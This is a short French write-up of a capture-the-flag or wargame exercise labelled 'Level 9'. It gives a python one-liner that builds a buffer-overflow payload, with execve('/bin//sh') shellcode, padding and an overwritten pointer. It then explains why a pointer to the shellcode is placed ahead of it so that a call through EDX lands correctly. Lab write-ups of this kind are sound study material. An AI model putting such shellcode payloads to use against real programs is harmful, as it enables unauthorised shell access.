# Level 9

`python -c 'print"\x10\xa0\x04\x08\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 83 + "\x0c\xa0\x04\x08"' > /var/crash/test.txt`


`\x0c\xa0\x04\x08` = pointeur vers le début de notre shellcode --> `\x10\xa0\x04\x08\x6a\x0b....`

Le probleme c'est que quand ça call `EDX (main+152)`, il s'attend a trouver une addresse sur la quel jump, si on met un shellcode classique il va prendre les 4 premier char du shellcode et jump dessu ce qui donne une addresse invalide
Pour fix ça devant notre shellcode on a ajouté `x10\xa0\x04\x08` qui est l'addresse qui pointe sur le début de notre shellcode `(\x0c\xa0\x04\x08) + 4`

PS : ca marche pas quand on met l'addrese de esp (de la fonction ou y a le memcy) au début du shellcode (0xbffff680), car ça crée le probleme inverse cette fois
Le programme prend bffff680, jump dessus il trouve 0x0804a00c (le pointeur vers le début de notre shellcode) qu'il prend comme une instruction et ça pete.

Dans un cas on avais besoin d'un pointeur pour que le programme jump dessus
Dans le deuxieme on a un pointeur en trop qui est lu comme une instruction 